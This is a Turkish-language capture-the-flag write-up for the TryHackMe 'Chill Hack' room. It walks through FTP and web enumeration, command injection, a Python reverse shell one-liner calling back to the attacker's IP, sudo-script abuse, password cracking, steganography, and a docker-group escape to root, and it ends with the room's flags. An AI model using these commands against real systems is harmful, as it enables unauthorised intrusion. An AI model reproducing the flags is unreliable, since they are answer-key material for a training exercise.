---
title: Chill Hack
date: 2024-03-27 13:13:12 
categories: [TryHackMe]
tags: [Easy,SQLi,Command İnjection]  
image: https://nepcodex.com/wp-content/uploads/2021/07/chill-hack-e1627133005491.png
---

<a href="https://tryhackme.com/room/chillhack">Chill Hack</a>

---

Öncelikle nmap taraması başlatalım.


```bash
┌──(root㉿r3tr0)-[~]
└─# nmap -T5 -v -sV  10.10.28.212 
```

nmap çıktısı:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-11 17:30 EST
NSE: Loaded 46 scripts for scanning.
Initiating Ping Scan at 17:30
Scanning 10.10.28.212 [4 ports]
Completed Ping Scan at 17:30, 0.12s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 17:30
Completed Parallel DNS resolution of 1 host. at 17:30, 0.00s elapsed
Initiating SYN Stealth Scan at 17:30
Scanning 10.10.28.212 (10.10.28.212) [1000 ports]
Discovered open port 22/tcp on 10.10.28.212
Discovered open port 80/tcp on 10.10.28.212
Discovered open port 21/tcp on 10.10.28.212
Completed SYN Stealth Scan at 17:30, 1.41s elapsed (1000 total ports)
Initiating Service scan at 17:30
Scanning 3 services on 10.10.28.212 (10.10.28.212)
Completed Service scan at 17:31, 6.22s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.28.212.
Initiating NSE at 17:31
Completed NSE at 17:31, 0.43s elapsed
Initiating NSE at 17:31
Completed NSE at 17:31, 0.38s elapsed
Nmap scan report for 10.10.28.212 (10.10.28.212)
Host is up (0.096s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.82 seconds
           Raw packets sent: 1004 (44.152KB) | Rcvd: 1001 (40.040KB)
```                    

ftp servisine anonymous olarak girmeyi deneyelim.

```bash               
┌──(root㉿r3tr0)-[~]
└─# ftp 10.10.28.212        
Connected to 10.10.28.212.
220 (vsFTPd 3.0.3)
Name (10.10.28.212:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||10060|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        115          4096 Oct 03  2020 .
drwxr-xr-x    2 0        115          4096 Oct 03  2020 ..
-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
226 Directory send OK.
ftp> get note.txt
local: note.txt remote: note.txt
229 Entering Extended Passive Mode (|||57821|)
150 Opening BINARY mode data connection for note.txt (90 bytes).
100% |****************************************************************|    90       58.35 KiB/s    00:00 ETA
226 Transfer complete.
90 bytes received in 00:00 (0.94 KiB/s)
ftp> exit
221 Goodbye.
```         

note.txt dosyası buluyorum ve indirip içeriğine bakıyorum.

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/ChillHack/images/a1.png?raw=true)


Henüz bununla ne yapılacağından tam olarak emin değilim, o yüzden numaralandırmaya devam edelim. İki olası kullanıcı adımız var: Anurodh ve Apaar.

Web sitesini ziyaret edelim.

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/ChillHack/images/a2.png?raw=true)

Siteye gittiğimizde basit bir web sayfası buluyoruz.

Gobuster çalıştırıp gizli dizin arayalım.

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/ChillHack/images/a3.png?raw=true)

secret sayfasını buluyorum ve araştırmak için siteye gidiyorum.

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/ChillHack/images/a4.png?raw=true)

Komut çalıştırabileceğimiz bir websitesi bırak kurcalayalım.

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/ChillHack/images/a5.png?raw=true)

[Revshell](https://www.revshells.com/) sitesine giderek reverse shell kodunu kopyalıyorum.

```bash
export RHOST="10.14.61.127";export RPORT=1234;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/ChillHack/images/a6.png?raw=true)

Makineye giriş yapmayı başardım.

Shellimizi stabil hale getirelim.

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Apaar'ın ana dizinindeki local.txt bayrağına erişmeye çalışırken erişim reddedildi. Www-data kullanıcısının ayrıcalıklarını yükseltmemiz gerekecek gibi görünüyor.


```bash
ww-data@ubuntu:/home/apaar$ sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User www-data may run the following commands on ubuntu:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
```

İlginç, dosyayı cat ile açalım.

```bash
www-data@ubuntu:/home/apaar$ cat .helpline.sh
#!/bin/bash
echo
echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"
echo
read -p "Enter the person whom you want to talk with: " person
read -p "Hello user! I am $person,  Please enter your message: " msg
$msg 2>/dev/null
echo "Thank you for your precious time!"
```

Bu dosya ile apaar kullanıcısına geçebiliriz.

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/ChillHack/images/a7.png?raw=true)

user bayrağını alalım.

```bash
apaar@ubuntu:~$ ls
ls
local.txt
apaar@ubuntu:~$ cat local.txt
cat local.txt
{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}
```

`{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}`

Geri yetki yükseltmek ve root bayrağını almak kaldı.

Makinede biraz gezindikten sonra index.php dosyasının içinde bazı işe yarar bilgiler buluyorum.

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/ChillHack/images/a8.png?raw=true)

Bu bilgilerle database'e erişmeye çalışalım.



```bash
apaar@ubuntu:/var/www/files$ mysql -u root -p'!@m+her00+@db'
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 3
Server version: 5.7.31-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.
Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.
No entry for terminal type "unknown";
using dumb terminal settings.
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| webportal          |
+--------------------+
5 rows in set (0.00 sec)
mysql> use webportal;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A
Database changed
mysql> show tables;
+---------------------+
| Tables_in_webportal |
+---------------------+
| users               |
+---------------------+
1 row in set (0.00 sec)
mysql> select * from users;
+----+-----------+----------+-----------+----------------------------------+
| id | firstname | lastname | username  | password                         |
+----+-----------+----------+-----------+----------------------------------+
|  1 | Anurodh   | Acharya  | Aurick    | 7e53614ced3640d5de23f111806cc4fd |
|  2 | Apaar     | Dahal    | cullapaar | 686216240e5af30df0501e53c789a649 |
+----+-----------+----------+-----------+----------------------------------+
2 rows in set (0.00 sec)
```

Anurodh kullanıcısının password hash'ini bulduk.[CrackStation](https://crackstation.net/) sitesine giderek hash'i kıralım.

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/ChillHack/images/a9.png?raw=true)

Bu bilgiler ile makineye giriş yapılamıyor. Tamamen zaman kaybettirmek için oluşturulmuş :)

/var/www/files içinde hacker.php dosyası dikkatimi çekti. cat ile açtığımda ipucu buldum.

```
<center>
	<img src = "images/hacker-with-laptop_23-2147985341.jpg"><br>
	<h1 style="background-color:red;">You have reached this far. </h2>
	<h1 style="background-color:black;">Look in the dark! You will find your answer</h1>
</center>
```

Images dizininin içinde, içinde gizli bir dosya olup olmadığını kontrol edebileceğimiz bir resim var. Hedefin içinde bir Python web sunucusu başlatalım:

```bash
python3 -m http.server 1234 
```

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/ChillHack/images/a10.png?raw=true)


Daha sonra kaliye dönerek fotoğrafı makinemize indirelim.

```bash
wget http://10.10.28.212:1234/hacker-with-laptop_23-2147985341.jpg
```


![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/ChillHack/images/a11.png?raw=true)


![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/ChillHack/images/a12.png?raw=true)

steghide ile fotoğrafın içinde gizli bir dosya olup olmadığına bakalım.

```bash
┌──(root㉿r3tr0)-[~]
└─# steghide extract -sf hacker-with-laptop_23-2147985341.jpg 
Enter passphrase: 
wrote extracted data to "backup.zip".
 ```         

Fotoğrafın içinde backup.zip adlı dosya bulduk.

Şifreyi kırmak için JohnTheRipper'ı kullanalım. Ancak önce zip dosyasını John'un şifreyi kırmak için kullanabileceği bir formata dönüştürmemiz gerekiyor. Bunu yapmak için zip2john'u kullanıyoruz:

 ```bash                                                                                                       
zip2john backup.zip > zipToJohnFile 
 ```
Dosyayı oluşturduktan sonra john ile şifreyi kırıyoruz.

 ```bash
┌──(root㉿r3tr0)-[~]
└─# john zipToJohnFile --wordlist=/usr/share/wordlists/rockyou.txt 
 ```

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/ChillHack/images/a13.png?raw=true)

>pass1word

zip dosyasını şifreyi girip açtığımızda içinde source_code.php isimli php dosyasının olduğunu görüyoruz.

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/ChillHack/images/a14.png?raw=true)

Dosyanın içerisinde base64 ile kodlanmış bir şifre var kırıp ne olduğunu görelim.

 ```bash
┌──(root㉿r3tr0)-[~]
└─# echo "IWQwbnRLbjB3bVlwQHNzdzByZA==" | base64 --decode
!d0ntKn0wmYp@ssw0rd                                                                                          
 ```

Anurodh kullanıcısının şifresini bulduk. SSH ile giriş yapalım.

```bash
anurodh@ubuntu:~$ id
uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)                                          
```

anurodh kullanıcısının 999(docker) grubunda olduğunu görüyoruz.

İnternette biraz araştırma yaptım. Docker ile yetki yükseltme kodlarını paylaşan bir [web sitesi](https://keiran.scot/2020/07/05/privilege-escalation-with-docker/) buldum.

Aşağıdaki komutu çalıştırarak yetkimizi yükseltebiliriz.


```bash
anurodh@ubuntu:~$ docker run -it -v /:/mnt alpine chroot /mnt sh                                              
# whoami
root
```

Root olduğumuza göre root bayrağını alabiliriz.

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/ChillHack/images/a15.png?raw=true)

`{ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}`

![fsoc](/images/fsoc.gif)

